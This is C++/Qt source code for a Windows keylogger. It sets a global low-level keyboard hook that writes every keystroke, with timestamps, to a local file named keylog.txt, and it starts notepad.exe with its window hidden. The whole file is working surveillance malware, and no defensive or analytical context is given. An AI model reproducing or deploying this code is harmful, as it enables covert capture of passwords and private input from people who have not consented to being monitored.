#include <QCoreApplication>
#include <QFile>
#include <QTextStream>
#include <QDateTime>
#include <windows.h>
#include <tlhelp32.h>

HHOOK g_keyboardHook = nullptr;
QString g_logFilePath = "keylog.txt";

void logToFile(const QString& message) {
    QFile file(g_logFilePath);
    if (file.open(QIODevice::WriteOnly | QIODevice::Append)) {
        QTextStream stream(&file);
        stream << QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss.zzz")
               << " - " << message << "\n";
        file.close();
    }
}

bool launchHiddenProcess(const QString& exePath) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    wchar_t commandLine[MAX_PATH];
    wcscpy_s(commandLine, MAX_PATH, exePath.toStdWString().c_str());

    if (CreateProcessW(
                nullptr,
                commandLine,
                nullptr,
                nullptr,
                FALSE,
                CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                nullptr,
                nullptr,
                &si,
                &pi
                )) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            wchar_t keyName[256] = {0};

            if (GetKeyNameTextW(kbdStruct->scanCode << 16, keyName, 256) > 0) {
                logToFile("Key pressed: " + QString::fromWCharArray(keyName));
            }
        }
    }
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

void installKeyboardHook() {
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(nullptr), 0);
    if (!g_keyboardHook) {
        logToFile("ERROR: Failed to install keyboard hook");
    }
}

void uninstallKeyboardHook() {
    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = nullptr;
    }
}

bool isProcessRunning(const QString& processName) {
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    bool exists = false;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (QString::fromWCharArray(pe32.szExeFile).compare(processName, Qt::CaseInsensitive) == 0) {
                exists = true;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return exists;
}

int main(int argc, char *argv[]) {
    QCoreApplication app(argc, argv);
    installKeyboardHook();

    const QString targetApp = "C:\\Windows\\System32\\notepad.exe";
    const QString targetProcess = "notepad.exe";

    if (!isProcessRunning(targetProcess)) {
        if (launchHiddenProcess(targetApp)) {
            logToFile("Successfully launched hidden process");
        } else {
            DWORD error = GetLastError();
            logToFile("ERROR: Failed to launch process. Code: " + QString::number(error));
        }
    } else {
        logToFile("Process already running. Skipping launch.");
    }

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    uninstallKeyboardHook();
    return 0;
}
